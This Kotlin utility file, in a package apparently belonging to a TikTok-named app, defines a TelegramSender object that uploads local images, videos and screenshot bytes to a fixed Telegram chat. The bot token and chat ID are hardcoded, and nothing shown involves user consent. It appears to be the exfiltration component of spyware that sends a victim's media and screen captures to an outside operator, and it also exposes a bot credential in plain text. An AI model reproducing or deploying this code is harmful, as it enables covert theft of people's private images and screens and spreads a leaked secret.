package com.dragon.tiktok.utils

import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

object TelegramSender {
    private const val BOT_TOKEN = "8784949333:AAFOO-zKjKnTwNPD1400MimSHeTNinKue2c"
    private const val CHAT_ID = "6156828092"
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    fun sendMedia(file: File, caption: String) {
        try {
            val mediaType = if (file.extension in listOf("jpg", "jpeg", "png", "gif", "bmp")) {
                "image/*".toMediaType()
            } else {
                "video/*".toMediaType()
            }
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.name, file.asRequestBody(mediaType))
                .build()
            val request = Request.Builder()
                .url("https://api.telegram.org/bot$BOT_TOKEN/sendDocument")
                .post(body)
                .build()
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    println("Ошибка отправки: ${response.code}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun sendImage(imageBytes: ByteArray, caption: String) {
        try {
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", "screenshot.png",
                    imageBytes.toRequestBody("image/png".toMediaType()))
                .build()
            val request = Request.Builder()
                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                .post(body)
                .build()
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    println("Ошибка отправки скрина: ${response.code}")
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}